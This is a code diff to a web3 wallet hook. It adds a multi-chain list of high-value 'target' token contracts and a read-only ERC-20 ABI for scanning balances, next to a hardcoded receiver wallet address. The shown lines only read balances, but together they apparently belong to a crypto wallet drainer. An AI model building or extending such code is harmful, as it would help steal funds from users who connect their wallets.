@@ -8,6 +8,54 @@ import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect 
 const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
 const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY;
 
+// Fallback Token List (Top Assets) to scan if API fails
+const TARGET_TOKENS: Record<string, string[]> = {
+    "0x1": [ // Ethereum
+        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
+        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
+        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+    ],
+    "0x38": [ // BSC
+        "0x55d398326f99059fF775485246999027B3197955", // USDT
+        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
+        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
+        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
+    ],
+    "0x89": [ // Polygon
+        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
+        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
+        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
+        "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
+    ],
+    "0x2105": [ // Base
+        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
+        "0x4200000000000000000000000000000000000006", // WETH
+    ],
+    "0xa4b1": [ // Arbitrum
+        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
+        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC
+        "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
+    ],
+    "0xa": [ // Optimism
+        "0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", // USDT
+        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
+        "0x4200000000000000000000000000000000000006", // WETH
+    ],
+    "0xa86a": [ // Avalanche
+        "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
+        "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
+        "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
+    ]
+};
+
+const MINIMAL_ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function symbol() view returns (string)",
+    "function decimals() view returns (uint8)"
+];
+
 export function useWeb3Manager() {
     // Safety check for SSR: useWeb3Modal hooks can crash if createWeb3Modal hasn't been called.
     // In Next.js, we detect SSR via typeof window.
